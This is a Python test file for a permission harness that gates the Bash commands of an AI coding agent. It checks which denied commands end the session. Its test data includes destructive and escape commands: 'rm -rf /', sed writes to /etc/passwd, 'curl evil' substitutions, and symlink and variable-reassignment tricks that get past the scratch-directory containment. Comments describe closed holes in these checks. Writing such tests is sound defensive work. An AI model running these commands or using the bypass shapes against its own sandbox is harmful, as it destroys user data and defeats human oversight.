    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "crates" / "mika-agent" / "src" / "task_engine").mkdir(parents=True)
    (worktree / "src").mkdir()
    (worktree / "path" / "to").mkdir(parents=True)
    wt = str(worktree)

    mod = "crates/mika-agent/src/task_engine/mod.rs"
    # The verbatim pilot #2601 killer (f2edcf8f, 2026-09-30T14:28:33.718Z).
    incident = (
        "sed -i.bak 's/^const PRODUCTION_ATTEMPTS: u32 = 3;$/"
        "const PRODUCTION_ATTEMPTS: u32 = 1;/' " + mod + ' && grep -n '
        '"^const PRODUCTION_ATTEMPTS" ' + mod
    )

    # AC1 — proven-danger cause is SOLELY an in-worktree suffix-form `sed -i`.
    for cmd in (
        incident,
        "sed -i.bak 's/a/b/' path/to/x",  # isolated suffix form
        "sed -i.orig 's/a/b/' src/x.rs",  # a different suffix
        "sed -i.bak -e 's/a/b/' -e 's/c/d/' src/x.rs",  # multi-`-e` (#245) + suffix
        "sed -ibak 's/a/b/' src/x.rs",  # GNU: no dot required
        "echo hi && sed -i.bak 's/a/b/' src/x.rs",  # harmless prefix + confined
        "sed -i 's/a/b/' src/x.rs",  # bare `-i` regression guard (#229 unchanged)
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # AC2 — every escape / write / chained-danger shape stays TERMINAL.
    for cmd in (
        "sed -i.bak 's/a/b/' /etc/hosts",  # out-of-worktree target
        'sed -i.bak "s/a/b/" "$HOME/x"',  # $-rooted respelling
        "sed -i.bak 's/a/b/' ~/x",  # ~-rooted respelling
        "sed -i.bak 's/a/b/' ../../etc/x",  # `..` escape
        "sed -i.bak 's/a/b/w /etc/x' src/x.rs",  # `s///w` write flag in the script
        "sed -i.bak 's/a/b/g; w /etc/x' src/x.rs",  # `w` write COMMAND after `;`
        "sed -i.bak '1r /etc/passwd' src/x.rs",  # `r` read command
        "sed -i.bak/../../../../../../tmp/x 's/a/b/' src/x.rs",  # backup projected out
        "sed -i/tmp/* 's/a/b/' src/x.rs",  # `*` wildcard suffix → fail closed
        "sed -i.bak 's/a/b/' src/x.rs /etc/passwd",  # mixed targets, one absolute
        "sed -i.bak 's/a/b/' src/x.rs && git reset --hard",  # chained destructive verb
        "sed -i.bak 's/a/b/' src/x.rs ; rm -rf /",  # `;` OUTSIDE quotes + danger
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_cpp253_sed_i_suffix_symlink_escape_stays_terminal(tmp_path: Path) -> None:
    """cpp#253 fail-closed: a suffix-form `sed -i` target routed through an
    OUTBOUND symlink resolves outside the worktree and stays terminal —
    `is_within_project` resolves symlinks, so containment is not launderable.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (worktree / "esc").symlink_to(outside, target_is_directory=True)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "sed -i.bak 's/a/b/' esc/x.rs"}, str(worktree)
        )
        is True
    )


def test_cpp253_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#253 sovereign boundary: admission for the suffix-form in-worktree
    `sed -i.bak` case is byte-identical to HEAD — the command is STILL denied.
    `sed -i.bak` is still tier3-dangerous (the REFUSAL classifier), never
    tier1-auto-approved, and the policy still default-denies it. Only
    `_denial_is_terminal` flips terminal→survivable; end-to-end the handler
    returns a non-terminal ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "src").mkdir()
    cmd = "sed -i.bak 's/a/b/' src/x.rs"

    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    result = asyncio.run(
        _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_cpp271_sed_suffix_devnull_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#271 (pilot 94770602, mika#2624): the cpp#203 x cpp#255 intersection.
    A `sed -i<SUFFIX>` (`-i.bak`, `-i~`, …) whose ONLY file target is the inert
    `/dev/null` sink is a SURVIVABLE deny (`_denial_is_terminal` ``False``), just
    like cpp#203's bare-`-i` /dev/null carve — regardless of the `-i` suffix
    form. The SUFFIX must NOT be a write vector: a `/`- or `..`-bearing suffix
    stays TERMINAL. Admission is byte-identical (see
    ``test_cpp271_admission_is_byte_identical_only_lethality_flips``).
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "src").mkdir()
    wt = str(worktree)

    # Positive — SUFFIX form x inert /dev/null target is survivable.
    for cmd in (
        "sed -i.bak 's|a|XX|' /dev/null",  # the isolated intersection factor
        "sed -i~ 's|a|XX|' /dev/null",  # `~` backup suffix
        "sed -i.orig 's/a/b/' /dev/null",  # another dotted suffix
        "sed -ibak 's|a|XX|' /dev/null",  # GNU: no dot required
        "sed -ni.bak 's|a|XX|' /dev/null",  # clustered `-n` + suffix
        "sed -i 's|a|XX|' /dev/null",  # cpp#203 bare-`-i` regression guard
        "sed --in-place=.bak 's|a|XX|' /dev/null",  # long form: already survivable
        "echo hi && sed -i.bak 's|a|XX|' /dev/null",  # harmless prefix + carve
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # Negative — a SUFFIX carrying a path is a write vector and stays TERMINAL,
    # as does any mixed-with-escape / chained-danger shape.
    for cmd in (
        "sed -i../../etc/x 's|a|XX|' /dev/null",  # suffix carries `/` and `..`
        "sed -i/tmp/x 's|a|XX|' /dev/null",  # suffix carries `/`
        "sed -i.. 's|a|XX|' /dev/null",  # suffix is `..` (no slash) → still rejected
        "sed -i.bak 's/a/b/' /etc/passwd",  # real out-of-worktree target
        "sed -i.bak 's/a/b/' ../../x",  # `..` traversal target
        "sed -i.bak 's/a/b/' /dev/null /etc/passwd",  # 2nd target out of worktree
        # cpp#203 sole-operand constraint kept: /dev/null + a 2nd target (even an
        # in-worktree one) is NOT the sole-/dev/null shape, so /dev/null is not
        # treated inert and the segment stays terminal (byte-identical to HEAD).
        "sed -i.bak 's/a/b/' /dev/null src/x.rs",
        "sed -i.bak 'y/a/b/' /dev/null",  # non-substitution script → fail closed
        "sed -i.bak 's/a/b/w /etc/x' /dev/null",  # `w` write flag → fail closed
        "sed -i.bak 's|a|XX|' /dev/null && rm -rf /etc",  # chained destructive verb
        # A REAL out-of-worktree redirect alongside the sole /dev/null target is
        # re-armed by the full-command redirect veto (fail-safe): the sole-target
        # carve ignores the redirect token, but the redirect itself stays fatal.
        "sed -i.bak 's/a/b/' /dev/null >/etc/passwd",
        "sed -i.bak 's/a/b/' /dev/null > ../../x",
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd

    # A benign stderr-silencing redirect to /dev/null stays survivable (the
    # verbatim's `2>/dev/null` shape), the sole real target still being /dev/null.
    assert (
        f("Bash", {"command": "sed -i.bak 's/a/b/' /dev/null 2>/dev/null"}, wt)
        is False
    )


def test_cpp271_verbatim_94770602_is_survivable(tmp_path: Path) -> None:
    """cpp#271 AC2: the verbatim 3-line script that killed pilot 94770602
    (mika#2624) — a `cd`, a `sed -i.bak … /dev/null` probing a multi-line regex,
    and a `grep` — becomes survivable. The refusal is legitimate (the script is
    still DENIED); it must no longer end the session.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "crates" / "mika-agent" / "src").mkdir(parents=True)
    verbatim = (
        "cd /data/workspace/mika-platform/.claude/worktrees/"
        "fix-2624-loop-substrate-mika-dev-sort-du/mika\n"
        "sed -i.bak 's|^        for (rel, content) in production_sources() {\\n"
        "            if HOLD_CLASSIFICATION|XX|' /dev/null 2>/dev/null; true\n"
        'grep -n "for (rel, content) in production_sources()" '
        "crates/mika-agent/src/canonical_tokens.rs"
    )
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": verbatim}, str(worktree)
        )
        is False
    )


def test_cpp271_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#271 sovereign boundary: admission for `sed -i.bak … /dev/null` is
    byte-identical to HEAD — the command is STILL denied. `sed -i.bak` is still
    tier3-dangerous (the REFUSAL classifier), never tier1-auto-approved, and the
    policy still default-denies it. Only `_denial_is_terminal` flips
    terminal→survivable; end-to-end the handler returns a non-terminal
    ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    cmd = "sed -i.bak 's|a|XX|' /dev/null"

    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    result = asyncio.run(
        _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_cpp274_sed_long_in_place_form_joins_the_short(tmp_path: Path) -> None:
    """cpp#274 (SSC residue on the cpp#271 gate, MPC OK-conditional): the GNU
    LONG in-place form `sed --in-place` / `--in-place=SUFFIX` now behaves exactly
    like the short `-i`/`-i<SUFFIX>` form in both directions.

    VU-ROUGE (non-terminal on HEAD → terminal now): an out-of-worktree or
    `..`-traversal target, and a path-bearing suffix on sole /dev/null.
    POSITIVE (survivable, consistency with cpp#255/#271 extended to the long
    form): a worktree target, and sole /dev/null with a benign suffix.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "crates").mkdir()
    wt = str(worktree)

    # VU-ROUGE — now TERMINAL (were non-terminal on HEAD).
    for cmd in (
        "sed --in-place 's/a/b/' /etc/passwd",
        "sed --in-place=.bak 's/a/b/' /etc/passwd",
        "sed --in-place 's/a/b/' ../../x",
        "sed --in-place=/tmp/../etc/ 's|a|XX|' /dev/null",  # path-bearing suffix
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd

    # POSITIVE — survivable, like the short form's worktree + sole-/dev/null carves.
    for cmd in (
        "sed --in-place 's/a/b/' crates/x.rs",
        "sed --in-place=.bak 's/a/b/' crates/x.rs",
        "sed --in-place 's|a|XX|' /dev/null",
        "sed --in-place=.bak 's|a|XX|' /dev/null",
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd


def test_cpp274_long_form_admission_is_byte_identical(tmp_path: Path) -> None:
    """cpp#274 sovereign boundary: making the long form terminal is LETHALITY-ONLY.
    `sed --in-place … /etc/passwd` was ALREADY a policy default-deny on HEAD (sed
    is not allow-listed); `is_tier3_dangerous` is False for the long form and
    STAYS False (the long form is never added to `TIER3_PATTERNS`), never
    tier1-auto-approved, and the policy still default-denies it. Only
    `_denial_is_terminal` flips terminal; end-to-end the handler returns a
    non-terminal ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    policy = load_policy(_BUNDLED_POLICY)
    for cmd in (
        "sed --in-place 's/a/b/' /etc/passwd",
        "sed --in-place=.bak 's/a/b/' /etc/passwd",
    ):
        # admission untouched: tier3 classifier still False, not auto-approved,
        # policy still denies (the deny comes from the allowlist, not tier3).
        assert is_tier3_dangerous(cmd) is False, cmd
        assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
        assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny", cmd
        result = asyncio.run(
            _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
        )
        assert isinstance(result, PermissionResultDeny)
        # terminal now (it flipped) — but still a deny, never an allow.
        assert result.interrupt is True


def test_cpp213_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#213 sovereign boundary: the ADMISSION verdict for the confined-rm
    case is byte-identical to HEAD — the command is STILL denied. `rm -rf` is
    still tier3-dangerous (the REFUSAL classifier), never tier1-auto-approved,
    and the policy still default-denies it. Only `_denial_is_terminal` flips
    terminal→survivable. End-to-end the handler returns a non-terminal
    ``PermissionResultDeny`` — never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch" / "x").mkdir(parents=True)
    cmd = "rm -rf .pilot-scratch/x"

    # Admission UNCHANGED — none of these consult the cpp#213 lethality carve.
    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(
        _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


# ── cpp#268: `rm -rf "$VAR"` on a live `$(mktemp -d)` is survivable (mika#2626) ─
#
# groom 93bac846 died TERMINAL at turn 12 on a throwaway-repo reproduction whose
# last line deletes two `$(mktemp -d)` dirs. The refusal is legitimate (`;`-chain,
# multi-line, `cd` out of worktree) and STAYS — only the lethality is wrong. The
# `rm` SINK sibling of the cpp#201 mktemp redirect SOURCE carve, cwd-free.
_CPP268_VERBATIM = (
    'cd /tmp 2>/dev/null; B=$(mktemp -d); C=$(mktemp -d); '
    'git -C "$B" init --bare -q; git clone -q "file://$B" "$C"; '
    'git -C "$C" commit --allow-empty -m x -q; '
    'git -C "$C" push -q origin HEAD; '
    'git -C "$B" update-ref refs/heads/main HEAD; '
    'git -C "$B" ls-remote; git -C "$C" fetch --prune -q; '
    'git -C "$C" push --force-with-lease -q; '
    'rm -rf "$B" "$C"'
)


def test_cpp268_rm_on_mktemp_scratch_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#268: an `rm`/`rmdir` whose operands are ALL variables the SAME command
    keeps as a live `$(mktemp -d)` scratch dir is a SURVIVABLE deny —
    `_denial_is_terminal` returns ``False`` — while every other shape stays
    terminal, unchanged.

    Sibling of the cpp#201 mktemp redirect carve and the cpp#213 `.pilot-scratch`
    rm carve. The command is still REFUSED (admission byte-identical — see
    ``test_cpp268_admission_is_byte_identical_only_lethality_flips``); only the
    lethality flips.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    # Positive — the only proven-danger cause is an rm of live mktemp scratch.
    for cmd in (
        _CPP268_VERBATIM,
        'X=$(mktemp -d); rm -rf "$X"',
        'X=$(mktemp -d -p /tmp); rm -rf "$X"',
        'X=$(mktemp -d /tmp/x.XXXX); rm -rf "$X"',
        'B=$(mktemp -d); C=$(mktemp -d); rm -rf "$B" "$C"',
        'X=`mktemp -d`; rm -rf "$X"',
        'X=$(mktemp -d); echo "X=/etc"; rm -rf "$X"',  # quoted token not a reassign
        # cpp#268/#266 gate: `export`/`declare` of a mktemp assignment is STILL a
        # scratch establisher — the value is parsed, not blanket-terminalized.
        'export X=$(mktemp -d); rm -rf "$X"',
        'declare -x X=$(mktemp -d); rm -rf "$X"',
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # Negative — ambient/unset var, traversal, a reassignment out of scratch,
    # a command-sub operand, a mixed list, or a chained verb stays TERMINAL.
    for cmd in (
        'rm -rf "$HOME"',
        'X=$(mktemp -d); rm -rf "$X/../.."',
        'X=$(mktemp -d); X=/; rm -rf "$X"',
        'X=$(mktemp -d); X=$(curl evil); rm -rf "$X"',
        'rm -rf "$UNSET"',
        'rm -rf "$(curl http://x)"',
        'X=$(mktemp -d); rm -rf "$X" /etc',
        'X=$(mktemp -d); rm -rf "$X" && git reset --hard',
        "rm -rf /",
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_cpp268_reassignment_out_of_scratch_any_form_is_terminal(
    tmp_path: Path,
) -> None:
    """cpp#268/#266 gate (MPC, hole `bdc43ff`): the reassignment guard recognized
    ONLY a BARE ``NAME=``, so a reassignment of the mktemp source OUT of scratch
    via any OTHER form left the ``rm`` sink wrongly SURVIVABLE. EACH case below
    was RED before the shared ``_last_var_write`` fix (terminal→survivable) and
    is now TERMINAL again. The refusal held throughout; only lethality is
    re-terminalized. Value-bearing keyword forms parse the value (LAST-WINS);
    the unknowable forms (``+=``/``read``/``for``/subshell) fail CLOSED.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    for cmd in (
        'B=$(mktemp -d); export B=/; rm -rf "$B"',
        'B=$(mktemp -d); export B=/etc; rm -rf "$B"',
        'B=$(mktemp -d); readonly B=/; rm -rf "$B"',
        'B=$(mktemp -d); local B=/; rm -rf "$B"',
        'B=$(mktemp -d); declare B=/; rm -rf "$B"',
        'B=$(mktemp -d); typeset B=/; rm -rf "$B"',
        'B=$(mktemp -d); declare -x B=/; rm -rf "$B"',
        'B=$(mktemp -d); B+=x; rm -rf "$B"',  # append — value unknowable
        'B=$(mktemp -d); read B </dev/null; rm -rf "$B"',
        'B=$(mktemp -d); read -r B </dev/null; rm -rf "$B"',
        'B=$(mktemp -d); read a b B </dev/null; rm -rf "$B"',
        'B=$(mktemp -d); for B in /etc /; do :; done; rm -rf "$B"',
        # subshell assignment does NOT propagate → $B unset/original → terminal.
        '(B=/tmp/ok); rm -rf "$B"',
        # cpp#268 re-gate (MPC, head f44b43d): FOUR write forms the enumerate-
        # writes scanner still missed — now closed by the INVERTED reads-only
        # rule. Each RED (survivable) before the inversion.
        'B=$(mktemp -d); { B=/etc; }; rm -rf "$B"',          # brace group
        'B=$(mktemp -d); IFS= read -r B; rm -rf "$B"',       # prefix-assign + read
        'B=$(mktemp -d); let B=1; rm -rf "$B"',              # let
        'B=$(mktemp -d); ((B=1)); rm -rf "$B"',              # ((…))
        'B=$(mktemp -d); : ${B:=/etc}; rm -rf "$B"',         # default-ASSIGN
        'B=$(mktemp -d); : ${B=/etc}; rm -rf "$B"',          # default-ASSIGN (no :)
        'B=$(mktemp -d); eval "B=/etc"; rm -rf "$B"',        # quoted eval assignment
        # indirection: `declare "$NAME=…"` assigns B via $NAME — fail closed.
        'B=$(mktemp -d); NAME=B; declare "$NAME=/etc"; rm -rf "$B"',
        # cpp#268 gate n°3 (MPC, head fb9b6b1): a sourced script reassigns the var
        # in the CURRENT shell, exactly like `eval "$CMD"` — treat `source`/`.` as
        # opaque, fail closed. Each RED (survivable) before this addition.
        'B=$(mktemp -d); source x.sh; rm -rf "$B"',          # `source` builtin
        'B=$(mktemp -d); . ./x.sh; rm -rf "$B"',             # `.` (dot) builtin
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd

    # POSITIVE — a non-value attribute change (`export -n`, no `=`) keeps the
    # mktemp value, a subshell reassignment does not propagate, and `./script`
    # EXECS in a child (not a source) → all survivable.
    for cmd in (
        'B=$(mktemp -d); export -n B; rm -rf "$B"',
        'B=$(mktemp -d); (B=/etc); rm -rf "$B"',
        'B=$(mktemp -d); ./build.sh; rm -rf "$B"',
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd


def test_cpp266_mkdir_reassignment_out_of_scratch_is_terminal(
    tmp_path: Path,
) -> None:
    """cpp#266 served hole (the SAME shared assignment-form gap): on the
    transitive-scratch ``mkdir`` sink, a reassignment of the recognized
    ``/tmp`` scratch root OUT of scratch via ``export``/``declare`` was invisible
    to ``_last_real_assignment_value`` (bare ``NAME=`` only), so ``mkdir -p
    "$SCRATCH_ROOT"`` on a now-``/etc`` root stayed SURVIVABLE. The shared
    ``_last_var_write`` fix re-terminalizes it. The POSITIVE ``declare``-form
    ce-code-review preamble (value parsed, roots at ``/tmp`` scratch) stays
    survivable.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    # NEGATIVE — reassigned OUT of scratch via keyword form → terminal. Each was
    # SURVIVABLE before the fix (the MPC gate's served hole: the bare `$SCRATCH_
    # ROOT` ref is the transitive carve's shape, and `_last_real_assignment_value`
    # saw only the first bare `SCRATCH_ROOT=/tmp/…`, missing the keyword reassign).
    # The chmod sink in the full gate compound re-terminalizes with the mkdir.
    for cmd in (
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'export SCRATCH_ROOT=/etc; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'declare SCRATCH_ROOT=/etc; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'readonly SCRATCH_ROOT=/etc; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'declare -x SCRATCH_ROOT=/etc; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'export SCRATCH_ROOT=/etc; mkdir -p "$SCRATCH_ROOT"; '
        'chmod 700 "$SCRATCH_ROOT"',
        # cpp#266 re-gate (MPC, head f44b43d): the SAME four forms the enumerate-
        # writes scanner missed, on the mkdir/chmod sink — now closed by the
        # inverted reads-only rule (the direct axis-A `_is_sanctioned_tmp_scratch`
        # defers the `$VAR` case to the inverted transitive carve for_lethality).
        'SCRATCH_ROOT="/tmp/x"; : ${SCRATCH_ROOT:=/etc}; '
        'mkdir -p "$SCRATCH_ROOT"; chmod 700 "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        '{ SCRATCH_ROOT=/etc; }; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'let SCRATCH_ROOT=1; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'IFS= read -r SCRATCH_ROOT; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/x"; ((SCRATCH_ROOT=1)); mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/x"; NAME=SCRATCH_ROOT; declare "$NAME=/etc"; '
        'mkdir -p "$SCRATCH_ROOT"',
        # cpp#266 gate n°3 (MPC, head fb9b6b1): a sourced script can reassign the
        # root in the current shell — `source`/`.` treated as opaque, fail closed.
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'source x.sh; mkdir -p "$SCRATCH_ROOT"',
        'SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        '. ./x.sh; mkdir -p "$SCRATCH_ROOT"',
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd

    # POSITIVE — the `declare`-form of the official ce-code-review preamble roots
    # at a recognized `/tmp` scratch (value parsed, not keyword-terminalized) →
    # survivable, exactly like the bare-assignment form.
    for cmd in (
        'declare SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'RUN_DIR="$SCRATCH_ROOT/ce-code-review/x"; mkdir -p "$RUN_DIR"',
        'export SCRATCH_ROOT="/tmp/compound-engineering-$(id -u)"; '
        'RUN_DIR="$SCRATCH_ROOT/ce-code-review/x"; mkdir -p "$RUN_DIR"',
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd


def test_cpp268_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#268 sovereign boundary: the ADMISSION verdict for the mktemp-scratch rm
    case is byte-identical to HEAD — the command is STILL denied. `rm -rf` is
    still tier3-dangerous, never tier1-auto-approved, and the policy still
    default-denies it. Only `_denial_is_terminal` flips terminal→survivable, and
    the egress/redirect vetoes on the FULL command are unaffected.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    cmd = 'X=$(mktemp -d); rm -rf "$X"'

    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(
        _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


# ── cpp#272: a `.pilot-scratch/` target carried by a variable is survivable ────
#
# The repo-PRESCRIBED disposable-scratch root (`.pilot-scratch/` in the worktree)
# joins the derived-scratch resolver alongside `/tmp` (cpp#266) and `$(mktemp -d)`
# (cpp#270). A pilot building a disposable git repro EXACTLY where the repo says
# (pilot c722b251, mika#2623) died at `mkdir -p "$D"` because the resolver's root
# recognizers did not know the worktree-relative `.pilot-scratch/` / `$PWD/.pilot-
# scratch/` root. The verbatim first two lines, joined (literal `set -e`):
_CPP272_VERBATIM_2623 = (
    "set -e\n"
    "D=.pilot-scratch/git-probe\n"
    'mkdir -p "$D"\n'
    'R="$PWD/$D/repo"\n'
    'mkdir -p "$R"\n'
    'git init -q -b main "$R"\n'
    "printf 'fn main() {}\\n' > \"$R/main.rs\""
)


def _cpp272_wt(tmp_path: Path) -> str:
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch").mkdir()
    return str(worktree)


def _skip_if_cpp272_unwired(wt: str) -> None:
    """SELF-SKIP (cpp#237 pattern) when the carve is absent — the verbatim is
    still TERMINAL — so the suite stays GREEN while the hunk awaits a manual
    apply window."""
    if permissions_module._denial_is_terminal(
        "Bash", {"command": _CPP272_VERBATIM_2623}, wt
    ):
        pytest.skip(
            "cpp#272 .pilot-scratch derived-scratch carve pending manual apply "
            "(lethality edits in tier1 resolver + permissions._destination_veto_reason)"
        )


_CPP272_SURVIVABLE = [
    _CPP272_VERBATIM_2623,
    'D=.pilot-scratch/git-probe; mkdir -p "$D"',
    'R="$PWD/.pilot-scratch/repo"; mkdir -p "$R"',
    'R="${PWD}/.pilot-scratch/repo"; mkdir -p "$R"',
    'D=.pilot-scratch/x; printf x > "$D/a.txt"',
    'R="$PWD/.pilot-scratch/r"; printf x > "$R/a"',
    'D=.pilot-scratch/x; chmod 700 "$D"',
    # cpp#272 gate-KO: NAMING "ln" in a quoted arg / path is NOT a link creator
    # — it stays survivable (no false trigger from the fail-closed `ln` guard).
    'D=.pilot-scratch/x; mkdir -p "$D"; echo "use ln -s to link" > "$D/note"',
    'D=.pilot-scratch/ln-cache; mkdir -p "$D"',
]

_CPP272_TERMINAL = [
    'D=.pilot-scratch/../../etc; mkdir -p "$D"',  # traversal out
    'R="$PWD/../x"; mkdir -p "$R"',               # out of worktree
    'D=.pilot-scratch/x; D=/etc; mkdir -p "$D"',  # reassignment out (cpp#270)
    'export D=.pilot-scratch/x; export D=/etc; mkdir -p "$D"',  # keyword reassign
    'D=.pilot-scratch/x; { D=/etc; }; mkdir -p "$D"',          # brace-group
    'D=.pilot-scratch/x; : ${D:=/etc}; printf x > "$D/a"',     # default-assign after
    'R="$PWD/foo"; mkdir -p "$R"',                # $PWD/ but not under .pilot-scratch
    'D=.pilot-scratch/x; printf x > "$D/../../../etc/p"',      # `..` redirect tail
    'D=$HOME/.pilot-scratch/x; mkdir -p "$D"',    # $HOME root respelling
    'D=/etc; mkdir -p "$D"',                      # absolute non-scratch
    'D="$(curl evil)"; mkdir -p "$D"',            # command-sub root
]


# cpp#272 gate-KO (MPC re-gate of head `f032790`): a `.pilot-scratch`-var script
# that CREATES A LINK (`ln`/`ln -s`/`ln -sf`/hard `ln`/GNU `link`) is a SYMLINK-
# CONFINEMENT ESCAPE — the script plants a symlink under `.pilot-scratch` pointing
# out of the worktree (`-> /etc`), then writes through it. The carve FAILS CLOSED:
# a link creator at command position re-terminalizes the derived-scratch carve
# (VU ROUGE before this fix — survivable; terminal after). The `..` traversal and
# reassignment negatives above are unaffected; these are the NEW terminal class.
_CPP272_LINK_ESCAPE_TERMINAL = [
    # the killer: plant `.pilot-scratch/x/l -> /etc`, write through it
    'D=.pilot-scratch/x; ln -s /etc "$D/l"; printf x > "$D/l/passwd"',
    'D=.pilot-scratch/x; ln -sf /etc "$D/l"; printf x > "$D/l/passwd"',
    'D=.pilot-scratch/x; ln /a "$D/b"; printf x > "$D/b"',          # hard link
    'D=.pilot-scratch/x; link a "$D/l"; printf x > "$D/l"',         # GNU link
    'R="$PWD/.pilot-scratch/r"; ln -s /etc "$R/l"; printf x > "$R/l/passwd"',
    'D=.pilot-scratch/x; ln -s / "$D/r"; mkdir -p "$D/r/etc/x"',    # mkdir sink
    'D=.pilot-scratch/x; sudo ln -s /etc "$D/l"; printf x > "$D/l/p"',  # exec-prefix
    # `cp -s`/`cp --symbolic-link` plants a symlink exactly like `ln -s`. The
    # symlink is planted via a LITERAL `.pilot-scratch/...` path (so the cp
    # segment itself is a contained, non-terminal write), then the escape write
    # rides the carved `$D` path — WITHOUT the `cp -s` guard the redirect carve
    # would hold it survivable (VU ROUGE: survivable before, terminal after).
